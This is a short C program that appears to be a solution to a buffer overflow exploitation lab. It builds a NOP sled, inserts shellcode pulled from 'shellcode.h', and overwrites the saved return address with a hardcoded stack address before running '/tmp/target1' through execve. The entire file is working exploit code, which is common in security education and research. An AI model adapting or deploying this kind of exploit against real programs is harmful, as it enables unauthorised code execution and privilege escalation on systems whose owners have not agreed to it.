#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];

  char buffer[228];

  memset(buffer, 0x90, 228);
  memcpy(buffer + 179, shellcode, 45);
  memcpy(buffer + 224, "\xac\xfc\xff\xbf", 4); // beginning of buf

  args[0] = TARGET;
  args[1] = buffer;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
